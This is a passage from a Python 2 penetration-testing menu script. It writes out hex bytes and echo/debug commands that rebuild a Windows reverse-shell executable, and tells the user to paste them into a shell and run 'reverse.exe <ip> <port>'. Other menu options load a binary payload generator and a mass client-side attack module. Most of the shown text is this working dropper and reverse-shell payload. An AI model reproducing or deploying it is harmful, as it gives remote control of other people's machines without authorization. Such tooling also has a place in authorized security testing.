3c d4 14 d4 0e 1b 33 c0 4e ec 87 0b 70 d2 8a 06 46 3d 3c 02 b3 12 0e f7 df 90 eb 0b 2c 30 19 8d 0c 89 06 48 83 2d 0a c0 75 f1 e8 04 11 33 51 c2 38 e2 30 83 c4 07 f4 6a f5 e8 69 09 19 49 ff bd 82 aa 20 0b d0 2a 93 75 37 f8 50 22 9d 29 86 06 fc e8 4d 2f 68 8b 24 38 e6 53 1a 0f 08 8d 50 03 21 18 83 c0 04 e3 f9 ff fe 80 02 f7 d3 23 cb 81 e1 44 80 74  >>reverse.hex\necho e 0500 >>reverse.hex && echo 7c e9 6c c1 0c 60 75 77 06 f4 10 c0 40 02 d0 e1 1b c2 51 5b 3a 47 c4 49 19 ca 0c 57 06 08 30 00 00 30 40 00 63 30 6d 64 00 66 3f 40 00 14 38 20 40 03 77 73 32 5f 33 98 2e 64 6c e3 c0 80 67 07 65 74 68 6f 73 40 62 79 6e 61 7b 6d cf 1e 63 9e 3c f7 eb ff 0e 12 57 53 41 5d cf 61 72 46 75 70 18 79 68 ca 2c 73 13 4f 26 63 6b 62 ef c1 ff b8 03 6c 95 1a 72 ca 5e 6c 4c c7 57 d3 69 74 f3 46  >>reverse.hex""")
                   binary1.close()
                   binary2=open("reversebinarygen.txt", "a")
                   binary2.write("""\necho e 0580 >>reverse.hex && echo a7 bc 91 47 c3 4c 43 6f 6d 88 61 6e 64 36 4c 69 44 62 7e 80 76 72 fb 9d 3a 50 b7 82 e7 73 15 41 58 21 c0 64 48 d0 43 2f 60 00 00 00 00 00 66 3f 40 00 4c 6f 61 64 4c 69 62 72 61 72 79 41 00 47 65 74 50 72 6f 63 41 64 64 72 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0c 40 00 00 e9 74 be ff ff 00 00 00 02 00 00 00 0c 40 00 00  >>reverse.hex\necho r cx >>reverse.hex && echo 04ef >>reverse.hex && echo w >>reverse.hex && echo q >>reverse.hex && debug<reverse.hex && copy 1.dll reverse.exe && del 1.dll && del reverse.hex\n\n\n******* COPY AND PASTE ABOVE TO A WINDOWS SHELL *******\n******* TO USE REVERSE USE reverse.exe <ip> <port> *******""")
                   binary2.close()
                   print 'Opening Kate...'
                   time.sleep(5)
                   kateopen=os.system("kwrite reversebinarygen.txt &")
	           print '\n***** COPY AND PASTE THE TEXT FILE OUTPUT *****\n'
                   print '***** To use reverse.exe use reverse.exe <ip> <port> *****\n'
                   pause=raw_input("Press enter to return to main menu")
                except Exception: 
		   print 'Something went wrong...Returning to main menu.'

             if choice1 == '2' :
                    import sys
                    definepath=os.getcwd()
                    sys.path.append("%s/bin/ftsrc/" % (definepath))
                    try: reload(binarypayloadgen)
                    except Exception: pass
                    import binarypayloadgen
         

# Start mass client attack
              
          if menu == '7' :
                    import sys
                    definepath=os.getcwd()
                    sys.path.append("%s/bin/ftsrc/clientattack/" % (definepath))
                    try: reload(massclient)
                    except Exception: pass
                    import massclient
      
           
# Return to previous menu

          if menu == '8' :
             print """\n\n       ***** Returning to Previous Menu *****\n"""
             break
